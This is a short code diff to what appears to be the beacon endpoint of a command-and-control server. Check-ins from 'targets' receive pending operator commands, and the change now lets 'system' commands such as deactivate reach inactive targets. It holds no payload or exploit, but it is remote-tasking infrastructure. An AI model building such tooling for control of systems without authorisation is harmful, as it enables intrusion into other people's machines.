@@ -109,20 +109,23 @@ def beacon(
     target.last_seen = datetime.now(timezone.utc)
     session.add(target)
 
-    # If the operator deactivated this target, return no commands
     payload: list[dict] = []
+    pending = session.exec(
+        select(Command)
+        .where(Command.target_id == target_id, Command.status == "pending")
+        .order_by(Command.created_at)  # type: ignore[arg-type]
+    ).all()
+
+    for cmd in pending:
+        # Always deliver system commands (e.g. deactivate); skip others if inactive
+        if target.status == "inactive" and cmd.module_name != "system":
+            continue
+        payload.append({"id": cmd.id, "command": cmd.command})
+        cmd.status = "sent"
+        session.add(cmd)
+
     if target.status != "inactive":
         target.status = "active"
-        pending = session.exec(
-            select(Command)
-            .where(Command.target_id == target_id, Command.status == "pending")
-            .order_by(Command.created_at)  # type: ignore[arg-type]
-        ).all()
-
-        for cmd in pending:
-            payload.append({"id": cmd.id, "command": cmd.command})
-            cmd.status = "sent"
-            session.add(cmd)
 
     session.commit()
     return BeaconResponse(
